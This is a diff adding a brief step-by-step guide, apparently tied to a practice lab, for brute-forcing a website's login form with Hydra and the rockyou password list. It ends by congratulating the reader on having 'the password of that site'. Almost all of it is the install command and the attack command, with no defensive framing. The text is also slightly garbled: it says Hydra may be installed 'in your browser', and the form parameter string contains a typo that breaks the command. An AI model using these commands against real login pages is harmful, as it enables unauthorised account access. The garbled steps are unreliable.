@@ -1,0 +1,9 @@
+1) If you have not yet installed hydra or it's not already installed in your browser
+   type "sudo apt install hydra" in your terminal.
+
+2) Then to find the password of the site digit:
+   "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <IP OF THE SITE(ex: 10.10.177.34)> http-post-form "/login:username=^USER^&password+^PASS^:Your username or password is incorrect."
+
+3) When hydra has finished the operation the password will appear in blue in the terminal
+
+Now you have the password of that site!👏👋
